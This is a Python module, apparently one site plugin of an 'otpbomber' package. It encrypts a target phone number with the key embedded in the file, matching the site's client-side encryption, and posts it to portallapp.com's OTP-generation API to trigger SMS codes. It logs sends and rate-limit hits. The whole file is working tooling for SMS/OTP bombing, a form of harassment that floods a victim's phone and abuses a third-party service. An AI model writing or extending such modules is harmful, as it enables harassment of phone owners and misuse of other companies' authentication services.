from otpbomber.core import *
from otpbomber.localuseragent import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import base64

def encrypt_mobile(mobile_no: str) -> str:
    part1 = "123456"
    part2 = "7890ab"
    part3 = "cdef"
    aes_key = (part1 + part2 + part3).encode()  # 16-byte AES key
    iv = get_random_bytes(16)  # 16-byte IV for AES-CBC
    
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(pad(mobile_no.encode(), AES.block_size))
    
    return base64.b64encode(iv + encrypted_data).decode()


async def portall(phone, client, out):
    name = "portall"
    domain = "portall"
    frequent_rate_limit=False

    
    encrypted_mobile = encrypt_mobile(phone[-10:])
    url = "https://portallapp.com/api/v1/auth/generate-otp-web"
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://portallapp.com',
        'referer': 'https://portallapp.com/',
    }
    
    json_data = { 'data': encrypted_mobile }
    response = await client.post(url, headers=headers, json=json_data)

    try:
        data=response.json()
        if data["status"] == "success" and data["message"] == "OTP sent successfully":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        if data["status"] == "error" and data["message"] == "Max limit exceeded for this phone and IP address":
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": True,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None